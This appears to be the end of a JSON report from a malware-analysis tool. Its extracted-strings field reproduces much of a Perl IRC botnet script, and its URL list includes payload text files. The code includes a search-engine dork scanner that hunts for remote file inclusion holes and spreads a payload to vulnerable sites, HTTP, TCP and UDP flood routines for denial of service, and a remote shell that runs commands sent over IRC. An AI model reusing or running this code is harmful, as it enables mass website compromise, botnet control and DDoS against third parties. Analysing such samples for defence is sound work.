            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################################################################",
            "#################### FireBall",
            "######################################################################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "# Starting The Search Engine",
            "    my @fireball=fireball($dork);",
            "push(my @tot, @fireball);",
            "my @puliti=&unici(@tot);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "1ire",
            "1all",
            "12 Total:",
            "4 \".scalar(@tot).\" ",
            "12Cleaned:",
            "4 \".scalar(@puliti).\" ",
            "12for ",
            "2 $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){ ",
            "if ($contatore==$uni-1){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Scan",
            "12] ",
            "1ire",
            "1all",
            "12 finished for",
            "2 $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(5);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /DarkMindZ/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "4OFF",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "elsif($re =~ /DarkMindZ/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "Vuln",
            "12] ",
            "12SafeMode:",
            "12Site:",
            "4 $print ",
            "2) \");",
            "my $test2=\"http://\".$sito.$bug.$spread.\"?\";",
            "my $reqz=HTTP::Request->new(GET=>$test2);",
            "my $ua=LWP::UserAgent->new();",
            "my $response=$ua->request($reqz);",
            "exit;",
            "######################",
            "#End of EXTREMESCANNER# ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#     HTTPFlood      # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "HTTP-DDOS",
            "12] Attacking",
            "4 \".$1.\" ",
            "12 on port 80 for ",
            "4 \".$2.\" ",
            "12 seconds ",
            ".\");",
            "my $itime = time;",
            "my ($cur_time);",
            "$cur_time = time - $itime;",
            "while ($2>$cur_time){",
            "$cur_time = time - $itime;",
            "my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);",
            "print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "close($socket);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "HTTP-DDOS",
            "12] Attacking done",
            "4 \".$1.\".\");",
            "######################",
            "#  End of HTTPFlood  # ",
            "#                    #",
            "######################",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "######################",
            "#     UDPFlood       # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "UDP-DDOS",
            "12] Attacking ",
            "4 \".$1.\" ",
            "12 with ",
            "4 \".$2.\" ",
            "12 Kb Packets for ",
            "4 \".$3.\" ",
            "12 seconds.",
            "my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");",
            "$dtime = 1 if $dtime == 0;",
            "my %bytes;",
            "$bytes{igmp} = $2 * $pacotes{igmp};",
            "$bytes{icmp} = $2 * $pacotes{icmp};",
            "$bytes{o} = $2 * $pacotes{o};",
            "$bytes{udp} = $2 * $pacotes{udp};",
            "$bytes{tcp} = $2 * $pacotes{tcp};",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "UDP-DDOS",
            "12] ",
            "12Results",
            "4 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" ",
            "12Kb in",
            "4 \".$dtime.\" ",
            "12seconds to",
            "4 \".$1.\".\");",
            "exit;",
            "######################",
            "#  End of Udpflood   # ",
            "#                    #",
            "######################",
            "sub ircase {",
            "my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   }",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "if ($case =~ /^rejoin\\s+(.*)/) {",
            "my $chan = $1;",
            "if ($chan =~ /^(\\d+) (.*)/) {",
            "for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "p(\"$2\");",
            "j(\"$2\");",
            "else {",
            "p(\"$chan\");",
            "j(\"$chan\");",
            "if ($case =~ /^op/) {",
            "op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "my $oarg = substr($case, 3);",
            "op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^deop/) {",
            "deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "my $oarg = substr($case, 5);",
            "deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "msg(\"$1\", \"$2\");",
            "if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "msg(\"$2\", \"$3\");",
            "if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "ctcp(\"$1\", \"$2\");",
            "if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "ctcp(\"$2\", \"$3\");",
            "if ($case =~ /^nick (.*)/) {",
            "nick(\"$1\");",
            "if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {",
            "conectar(\"$2\", \"$1\", 6667);",
            "if ($case =~ /^raw (.*)/) {",
            "sendraw(\"$1\");",
            "if ($case =~ /^eval (.*)/) {",
            "eval \"$1\";",
            "sub shell {",
            "my $printl=$_[0];",
            "my $comando=$_[1];",
            "if ($comando =~ /cd (.*)/) {",
            "chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");",
            "return;",
            "elsif ($pid = fork) {",
            "waitpid($pid, 0);",
            "else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my @resp=`$comando 2>&1 3>&1`;",
            "my $c=0;",
            "foreach my $linha (@resp) {",
            "  $c++;",
            "  chop $linha;",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "  if ($c == \"$linas_max\") {",
            "    $c=0;",
            "    sleep $sleep;",
            "exit;",
            "sub tcpflooder {",
            "my $itime = time;",
            "my ($cur_time);",
            "my ($ia,$pa,$proto,$j,$l,$t);",
            "$ia=inet_aton($_[0]);",
            "$pa=sockaddr_in($_[1],$ia);",
            "$ftime=$_[2];",
            "$proto=getprotobyname('tcp');",
            "$j=0;$l=0;",
            "$cur_time = time - $itime;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "socket($t,PF_INET,SOCK_STREAM,$proto);",
            "connect($t,$pa)||$j--;",
            "$j++;$l++;",
            "$l=0;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "shutdown($t,2);",
            "$l++;",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "# % The_PitBull Pwned your BoX  %",
            "# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%",
            "sub udpflooder {",
            "my $iaddr = inet_aton($_[0]);",
            "my $msg = 'A' x $_[1];",
            "my $ftime = $_[2];",
            "my $cp = 0;",
            "my (%pacotes);",
            "$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "return(undef) if $cp == 4;",
            "my $itime = time;",
            "my ($cur_time);",
            "while ( 1 ) {",
            "for (my $porta = 1;",
            "$porta <= 65000; $porta++) {",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "for (my $pc = 3;",
            "$pc <= 255;$pc++) {",
            "next if $pc == 6;",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;",
            "last if $cur_time >= $ftime;",
            "return($cur_time, %pacotes);",
            "sub ctcp {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "return unless $#_ == 1;",
            "sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub j {",
            "&join(@_);",
            "sub join {",
            "return unless $#_ == 0;",
            "sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_);",
            "sub part {",
            "sendraw(\"PART $_[0]\");",
            "sub nick {",
            "return unless $#_ == 0;",
            "sendraw(\"NICK $_[0]\");",
            "sub quit {",
            "sendraw(\"QUIT :$_[0]\");",
            "#####",
            "# SUBS GOOGLE",
            "#####",
            "sub googlet {",
            "my @dominios = (\"com\",\"net\",\"org\",\"info\",\"gov\", \"gob\",\"gub\",\"xxx\", \"eu\",\"mil\",\"edu\",\"aero\",\"name\",\"us\",\"ca\",\"mx\",\"pa\",\"ni\",\"cu\",\"pr\",\"ve\",\"co\",\"pe\",\"ec\",",
            "\t\t\"py\",\"cl\",\"uy\",\"ar\",\"br\",\"bo\",\"au\",\"nz\",\"cz\",\"kr\",\"jp\",\"th\",\"tw\",\"ph\",\"cn\",\"fi\",\"de\",\"es\",\"pt\",\"ch\",\"se\",\"su\",\"it\",\"gr\",\"al\",\"dk\",\"pl\",\"biz\",\"int\",\"pro\",\"museum\",\"coop\",",
            "\t\t\"af\",\"ad\",\"ao\",\"ai\",\"aq\",\"ag\",\"an\",\"sa\",\"dz\",\"ar\",\"am\",\"aw\",\"at\",\"az\",\"bs\",\"bh\",\"bd\",\"bb\",\"be\",\"bz\",\"bj\",\"bm\",\"bt\",\"by\",\"ba\",\"bw\",\"bn\",\"bg\",\"bf\",\"bi\",",
            "\t\t\"vc\",\"kh\",\"cm\",\"td\",\"cs\",\"cy\",\"km\",\"cg\",\"cd\",\"dj\",\"dm\",\"ci\",\"cr\",\"hr\",\"kp\",\"eg\",\"sv\",\"aw\",\"er\",\"sk\",",
            "\t\t\"ee\",\"et\",\"ge\",\"fi\",\"fr\",\"ga\",\"gs\",\"gh\",\"gi\",\"gb\",\"uk\",\"gd\",\"gl\",\"gp\",\"gu\",\"gt\",\"gg\",\"gn\",\"gw\",\"gq\",\"gy\",\"gf\",\"ht\",\"nl\",\"hn\",\"hk\",\"hu\",\"in\",\"id\",\"ir\",",
            "\t\t\"iq\",\"ie\",\"is\",\"ac\",\"bv\",\"cx\",\"im\",\"nf\",\"ky\",\"cc\",\"ck\",\"fo\",\"hm\",\"fk\",\"mp\",\"mh\",\"pw\",\"um\",\"sb\",\"sj\",\"tc\",\"vg\",\"vi\",\"wf\",\"il\",\"jm\",\"je\",\"jo\",\"kz\",\"ke\",",
            "\t\t\"ki\",\"kg\",\"kw\",\"lv\",\"ls\",\"lb\",\"ly\",\"lr\",\"li\",\"lt\",\"lu\",\"mo\",\"mk\",\"mg\",\"my\",\"mw\",\"mv\",\"ml\",\"mt\",\"mq\",\"ma\",\"mr\",\"mu\",\"yt\",\"md\",\"mc\",\"mn\",\"ms\",\"mz\",\"mm\",",
            "\t\t\"na\",\"nr\",\"np\",\"ni\",\"ne\",\"ng\",\"nu\",\"no\",\"nc\",\"om\",\"pk\",\"ps\",\"pg\",\"pn\",\"pf\",\"qa\",\"sy\",\"cf\",\"la\",\"re\",\"rw\",\"ro\",\"ru\",\"eh\",\"kn\",\"ws\",\"as\",\"sm\",\"pm\",\"vc\",\t\t",
            "\t\t\"sh\",\"lc\",\"va\",\"st\",\"sn\",\"sc\",\"sl\",\"sg\",\"so\",\"lk\",\"za\",\"sd\",\"se\",\"sr\",\"sz\",\"rj\",\"tz\",\"io\",\"tf\",\"tp\",\"tg\",\"to\",\"tt\",\"tn\",\"tr\",\"tm\",\"tv\",\"ug\",\"ua\",\"uz\",",
            "\t\t\"vu\",\"vn\",\"ye\",\"yu\",\"cd\",\"zm\",\"zw\",\"\");",
            "my @country = (\"AE\",\"AR\",\"AT\",\"AU\",\"BE\",\"BR\",\"CA\",\"CH\",\"CL\",\"DE\",\"DK\");",
            "my @lang = (\"en\",\"es\",\"de\",\"nl\",\"pt-BR\",\"it\",\"de\",\"fo\",\"sv\",\"fr\",\"el\");",
            "my @lst;",
            "my $key=key($_[0]);",
            "my $c=0;",
            "foreach my $i (@dominios){",
            "my @lista = google($i,$key,$lang[$c],$country[$c]);",
            "push(@lst,@lista);",
            "$c++;",
            "return @lst;",
            "sub google(){",
            "my @lst;",
            "my $i=$_[0];",
            "my $key=$_[1];",
            "my $lang= $_[2];",
            "my $country =$_[3];",
            "for($b=0;$b<=5000;$b+=100){",
            "my $Go=(\"www.google.\".$i.\"/search?hl=\".$lang.\"&q=\".key($key).\"&num=100&start=\".$b.\"&meta=cr%3Dcountry\".$country);",
            "my $Res=query($Go);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /google/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS AllTheWeb",
            "#####",
            "sub allthewebt {",
            "my @lang = (\"en\",\"es\",\"de\",\"nl\",\"pt-BR\",\"it\",\"de\",\"fo\");",
            "my @lst;",
            "my $key=key($_[0]);",
            "my $c=0;",
            "foreach my $lang (@lang){",
            "my @lista = alltheweb($key,$lang[$c]);",
            "push(@lst,@lista);",
            "$c++;",
            "return @lst;",
            "sub alltheweb(){",
            "my @lista;",
            "my $key = $_[0];",
            "my $lang= $_[1];",
            "for($b=0;$b<=500;$b+=100){",
            "my $alltheweb=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=\".$lang.\"&hits=100&q=\".key($key).\"&o=\".$b);",
            "my $Res=query($alltheweb);",
            "while($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub standard()",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=100)",
            "my $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);",
            "my $Res=query($all);",
            "while($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS AOL",
            "#####",
            "sub aol(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=100;$b++){",
            "my $AoL=(\"http://search.aol.com/aol/search?query=\".key($key).\"&page=\".$b.\"&nt=null&ie=UTF-8\");",
            "my $Res=query($AoL);",
            "while($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub aola(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=59;$b+=1){",
            "my $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_en\");",
            "my $Res=query($AoL);",
            "while($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub aolb(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=59;$b+=1){",
            "my $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_de\");",
            "my $Res=query($AoL);",
            "while($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub aolc(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=59;$b+=1){",
            "my $AoL=(\"http://64.12.129.44/aol/search?query=\".key($key).\"&page=\".$b.\"&count_override=20&lr=lang_fr\");",
            "my $Res=query($AoL);",
            "while($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS Yahoo",
            "#####",
            "sub yahoo(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=100){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahooa(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=210;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahoob(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=410;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahooc(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=610;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub yahood(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=810;$b<=1000;$b+=210){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS MSN",
            "#####",
            "sub msn(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $MsN=(\"http://search.live.com/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PERE\");",
            "my $Res=query($MsN);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if($1 !~ /msn|live/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS ASK",
            "#####",
            "sub ask(){",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=10)",
            "my $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");",
            "my $Res=query($Ask);",
            "while($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){",
            "my $k=$3;",
            "$k=~s/[\\\"\\ ]//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS FireBall",
            "#####",
            "sub fireball(){",
            "my $key=$_[0];",
            "my $inizio=1;",
            "my $pagine=200;",
            "my @lst;",
            "my $av=0;",
            "while($inizio <= $pagine){",
            "my $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";",
            "my $Res=query($fireball);",
            "while ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=\"$1/\";",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "$av=$av+10;",
            "$inizio++;",
            "return @lst;",
            "sub links()",
            "my @l;",
            "my $link=$_[0];",
            "my $host=$_[0];",
            "my $hdir=$_[0];",
            "$hdir=~s/(.*)\\/[^\\/]*$/\\1/;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$host.=\"/\";",
            "$link.=\"/\";",
            "$hdir.=\"/\";",
            "$host=~s/\\/\\//\\//g;",
            "$hdir=~s/\\/\\//\\//g;",
            "$link=~s/\\/\\//\\//g;",
            "push(@l,$link,$host,$hdir);",
            "return @l;",
            "sub geths(){",
            "my $host=$_[0];",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "return $host;",
            "sub key(){",
            "my $chiave=$_[0];",
            "$chiave =~ s/ /\\+/g;",
            "$chiave =~ s/:/\\%3A/g;",
            "$chiave =~ s/\\//\\%2F/g;",
            "$chiave =~ s/&/\\%26/g;",
            "$chiave =~ s/\\\"/\\%22/g;",
            "$chiave =~ s/,/\\%2C/g;",
            "$chiave =~ s/\\\\/\\%5C/g;",
            "return $chiave;",
            "sub query($){",
            "my $url=$_[0];",
            "$url=~s/http:\\/\\///;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host=~s/href=\\\"?http:\\/\\///;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query=~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "close($sock);",
            "return $page;",
            "sub unici{",
            "my @unici = ();",
            "my %visti = ();",
            "foreach my $elemento ( @_ )",
            "next if $visti{ $elemento }++;",
            "push @unici, $elemento;",
            "}   ",
            "return @unici;",
            "sub http_query($){",
            "my ($url) = @_;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host =~ s/href=\\\"?http:\\/\\///;",
            "$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query =~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "local $SIG{ALRM} = sub { die \"1\";};",
            "alarm 10;",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "alarm 0;",
            "close($sock);",
            "return $page;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "64.12.129.44"
        ],
        "url": [
            "http://www.alltheweb.com/search?cat=web&_sb_lang=",
            "http://",
            "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=",
            "http://it.ask.com/web?q=",
            "http://suche.fireball.de/cgi-bin/pursuit?pag=av&query=",
            "http://www.freewebs.com/scar_coder/id.txt",
            "http://www.xshqiptaretx.org/strings.txt",
            "http://milw0rm.com/rss.php",
            "http://search.live.com/results.aspx?q=",
            "http://64.12.129.44/aol/search?query=",
            "http://search.aol.com/aol/search?query=",
            "http://www.milw0rm.com/exploits/1",
            "http://www.freewebs.com/scar_coder/x2300.txt",
            "http://search.yahoo.com/search?ei=UTF-8&p="
        ]
    },
    "time": "0:00:00.603416",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
